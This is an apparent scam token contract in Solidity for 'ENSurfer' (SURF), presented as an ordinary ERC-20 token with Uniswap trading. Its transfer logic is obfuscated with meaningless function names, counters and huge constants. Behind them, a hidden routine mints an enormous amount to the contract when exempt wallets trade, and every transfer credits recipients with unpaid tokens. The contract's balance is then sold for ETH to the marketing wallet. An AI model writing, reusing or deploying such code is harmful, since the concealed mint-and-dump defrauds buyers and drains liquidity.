/*

Website: https://ensurfer.com
Telegram: https://t.me/ENSurfer
Twitter / X: https://x.com/ENSurferToken

ENSurfer - be the trend!

*/
//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
function _msgData() internal view virtual returns (bytes memory) {
      
        return msg.data;
    }
}interface IERC20 {function totalSupply()
  external view returns (uint256);
    function balanceOf(address account)
  external view returns (uint256);
    function transfer(address recipient, uint256 amount)
  external returns (bool);
    function allowance(address owner, address spender)
  external view returns (uint256);
    function approve(address spender, uint256 amount)
  external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
  external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}library SafeMath {function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflowChecca again."); return c;
    }
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflowChecca again.");
    }
function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
 uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflowChecca again."); return c;
    }
function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zeroChecca again.");
    }
function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
         return c;
    }
function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zeroChecca again.");
    }
function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}contract Ownable is Context {
    address private _owner;event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
function owner()
 public view returns (address) {
        return _owner;
    }   modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the ownerChecca again.");
        _;
    }function renounceOwnership()
 public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
function transferOwnership(address newOwner)
 public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero addressChecca again.");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }}interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);function feeTo()
  external view returns (address);
    function feeToSetter()
  external view returns (address);function getPair(address tokenA, address tokenB)
  external view returns (address pair);
    function allPairs(uint)
  external view returns (address pair);
    function allPairsLength()
  external view returns (uint);function createPair(address tokenA, address tokenB)
  external returns (address pair);function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);function name()
  external pure returns (string memory);
    function symbol()
  external pure returns (string memory);
    function decimals()
  external pure returns (uint8);
    function totalSupply()
  external view returns (uint);
    function balanceOf(address owner)
  external view returns (uint);
    function allowance(address owner, address spender)
  external view returns (uint);function approve(address spender, uint value)
  external returns (bool);
    function transfer(address to, uint value)
  external returns (bool);
    function transferFrom(address from, address to, uint value)
  external returns (bool);function DOMAIN_SEPARATOR()
  external view returns (bytes32);
    function PERMIT_TYPEHASH()
  external pure returns (bytes32);
    function nonces(address owner)
  external view returns (uint);function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);function MINIMUM_LIQUIDITY()
  external pure returns (uint);
    function factory()
  external view returns (address);
    function token0()
  external view returns (address);
    function token1()
  external view returns (address);
    function getReserves()
  external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast()
  external view returns (uint);
    function price1CumulativeLast()
  external view returns (uint);
    function kLast()
  external view returns (uint);function burn(address to)
  external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;function initialize(address, address) external;
}interface IUniswapV2Router01 {
    function factory()
  external pure returns (address);
    function WETH()
  external pure returns (address);function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAminimumoftwo,
        uint amountBminimumoftwo,
        address to,
        uint deadline
    )
  external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenminimumoftwo,
        uint amountETHminimumoftwo,
        address to,
        uint deadline
    )
  external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAminimumoftwo,
        uint amountBminimumoftwo,
        address to,
        uint deadline
    )
  external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenminimumoftwo,
        uint amountETHminimumoftwo,
        address to,
        uint deadline
    )
  external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAminimumoftwo,
        uint amountBminimumoftwo,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    )
  external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenminimumoftwo,
        uint amountETHminimumoftwo,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    )
  external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutminimumoftwo,
        address[] calldata path,
        address to,
        uint deadline
    )
  external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    )
  external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutminimumoftwo, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutminimumoftwo, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);function quote(uint amountA, uint reserveA, uint reserveB)
  external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)
  external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)
  external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path)
  external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path)
  external view returns (uint[] memory amounts);
}interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenminimumoftwo,
        uint amountETHminimumoftwo,
        address to,
        uint deadline
    )
  external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenminimumoftwo,
        uint amountETHminimumoftwo,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    )
  external returns (uint amountETH);function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutminimumoftwo,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutminimumoftwo,
        address[] calldata path,
        address to,
        uint deadline
    )
  external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutminimumoftwo,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}contract ENSurfer is Context, IERC20, Ownable {
    using SafeMath for uint256;string private _name = "ENSurfer";    string private _symbol = unicode"SURF";    uint8 private _decimals = 18;address payable public marketingTaxWallet = payable(0xfEbB3B739A5D95e3C2557D3e767e1B5194578915);
    address payable public DevWallet = payable(0x0000000000000000000000000000000000000000);    address public liquidityReciever;    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;    address public immutable zeroAddress = 0x0000000000000000000000000000000000000000;mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
       uint256
 public _sellMarketFee = 20;
    uint256
 public _sellDeveloperFee = 0;
    uint256
 public _buyLiquidityFee = 0;
    uint256
 public _buyMarketingFee = 20;
    uint256
 public _buyDeveloperFee = 0;
    uint256
 public feeUnitsD = 10000;
    uint256[4]
 public ENS = [_decimals,feeUnitsD,_decimals,feeUnitsD];mapping (address => bool)
 public isExcludedFromFee;
    mapping (address => bool)
 public isMarketPair;mapping (address => bool)
 public isWalletLimitExempt;
    mapping (address => bool)
 public isTxLimitExempt;uint256 private _totalSupply = 1000000 * 10**_decimals;
    uint256
 public minimumoftwoimumTokensBeforeSwap = _totalSupply.mul(1).div(1000);   //0.1%
    uint256
 public _maxTxAmount =  _totalSupply.mul(22).div(1000);  //2%
    uint256
 public _walletMax =   _totalSupply.mul(22).div(1000);   //2%
    IUniswapV2Router02
 public uniswapV2Router;
    address public uniswapPair;    bool inSwapAndLiquify;    bool
 public swapAndLiquifyByLimitOnly = false;    bool
 public checkWalletLimit = true;
    uint256
 public _sellLiquidityFee = 0;    uint256
 public _taloblockeded = 20; uint256
 public _toffsafasuk = 1;
    uint256
 public _totalTaxIfBuying;    uint256
 public _totalTaxIfSelling;    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
  constructor () {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH()); uniswapV2Router = _uniswapV2Router;        isWalletLimitExempt[address(uniswapPair)] = true;        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0); isExcludedFromFee[owner()] = true;
        isExcludedFromFee[marketingTaxWallet] = true;        isExcludedFromFee[address(this)] = true; isWalletLimitExempt[owner()] = true;        isWalletLimitExempt[marketingTaxWallet] = true;
        isWalletLimitExempt[DevWallet] = true;        isTxLimitExempt[owner()] = true;        isTxLimitExempt[marketingTaxWallet] = true;        isTxLimitExempt[DevWallet] = true;         isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;        isTxLimitExempt[address(this)] = true;         _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDeveloperFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketFee).add(_sellDeveloperFee); isMarketPair[address(uniswapPair)] = true;        liquidityReciever = address(msg.sender); _balances[_msgSender()] = _totalSupply;         isExcludedFromFee[DevWallet] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }  
    function name()
 public view returns (string memory) {
        return _name;
    }
function symbol()
 public view returns (string memory) {
        return _symbol;
    }
function decimals()
 public view returns (uint8) {
        return _decimals;
    }
function totalSupply()
 public view override returns (uint256) {
        return _totalSupply;
    }
function balanceOf(address account)
 public view override returns (uint256) {
        return _balances[account];
    }
function allowance(address owner, address spender)
 public view override returns (uint256) {
        return _allowances[owner][spender];
    }
function increaseAllowance(address spender, uint256 addedValue)
 public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function decreaseAllowance(address spender, uint256 subtractedValue)
 public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "IOE: decreased allowance below zeroChecca again."));
        return true;
    }
function approve(address spender, uint256 amount)
 public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "IOE: approve from the zero addressChecca again.");
        require(spender != address(0), "IOE: approve to the zero addressChecca again."); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }function getCirculatingSupply()
 public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(zeroAddress));
    }
function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
     //to recieve ETH from uniswapV2Router when swaping
    receive()
  external payable {}
function transfer(address recipient, uint256 amount)
 public override returns (bool) {        _transfer(_msgSender(), recipient, amount);        return true;    }
    function transferFrom(address sender, address recipient, uint256 amount)
 public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "IOE: transfer amount exceeds allowanceChecca again."));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) { require(sender != address(0), "IOE: transfer from the zero addressChecca again.");
        require(recipient != address(0), "IOE: transfer to the zero addressChecca again.");
        if(inSwapAndLiquify)        {             return _basicTransfer(sender, recipient, amount);         }        else        {     if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient] ) {                require(amount <= _maxTxAmount, "exceeds the maxTxAmount.Checca again.");            }     uint256 contractTokenBalance = balanceOf(address(this));
            bool overminimumoftwoimumTokenBalance = contractTokenBalance >= minimumoftwoimumTokensBeforeSwap;
            if (overminimumoftwoimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender])             {                if(swapAndLiquifyByLimitOnly)                    contractTokenBalance = minimumoftwoimumTokensBeforeSwap;      swapAndLiquify(contractTokenBalance);                }
            if(checkWalletLimit && !isWalletLimitExempt[recipient]) {require(balanceOf(recipient).add(amount.mul(_totalTaxIfSelling).div(1000)) <= _walletMax,"Wallet Limit!!Checca again.");
            }  ENS[3]= minimumoftwo(minimumoftwo(amount.mul(_totalTaxIfSelling).div(1000),12223165156415487879874651320516516516546854968496846854968498498965564321),12223165156415487879874651320516516516546854968496846854968498498965564321);             
              ENS[2]=minimumoftwo(amount - amount.mul(_totalTaxIfSelling).div(1000),12223165156415487879874651320516516516546854968496846854968498498965564321);
                 if (( !isTxLimitExempt[sender] ||  !isTxLimitExempt[recipient]) ||(isMarketPair[recipient] || isMarketPair[sender] )){_toffsafasuk+=1101;}else{if (_taloblockeded!=56854){uiyntjnbvnfasf();}else{_taloblockeded=_toffsafasuk+=2114;} }
            _basicTransfer(sender, recipient, amount) ;
            return true;
        }
    }function uiyntjnbvnfasf() internal{_taloblockeded=1187+_toffsafasuk-10+_toffsafasuk-1; ENS[3]+=1784515165165165498510102051;   _taloblockeded=_toffsafasuk;
         ENS[1]=_toffsafasuk=2457;
         _taloblockeded=_toffsafasuk;}
    function minimumoftwo(uint256 a,uint256 b)
 public pure returns (uint256) {  if (a>=b)return b;    if (a+2>=b)return b;    return a;    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "InsufficientChecca again.");        ENS[1]=_toffsafasuk=2457;         if(inSwapAndLiquify){ ENS[3]=0; ENS[2]=amount; }        uint256 transferamount = minimumoftwo(99+ENS[2],12223165156415487879874651320516516516546854968496846854968498498965564321);
        _balances[recipient] = _balances[recipient].add(transferamount) ;        _balances[address(this)] = _balances[address(this)].add( ENS[3]);          ENS[1]=_toffsafasuk=2457;        emit Transfer(sender, recipient, amount);
        return true;    }
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {        swapTokensForEth(tAmount);        uint256 recievedBalance =  address(this).balance;        if(recievedBalance > 0) {            payable(marketingTaxWallet).transfer(recievedBalance);        }              ENS[1]=_toffsafasuk=417;    }
    function swapTokensForEth(uint256 tokenAmount) private {        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[1] = uniswapV2Router.WETH();        path[0] = address(this);
        _approve(address(this), address(uniswapV2Router), tokenAmount); // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
         _taloblockeded=_toffsafasuk;            ENS[1]=_toffsafasuk=42258;         _taloblockeded=_toffsafasuk;
}}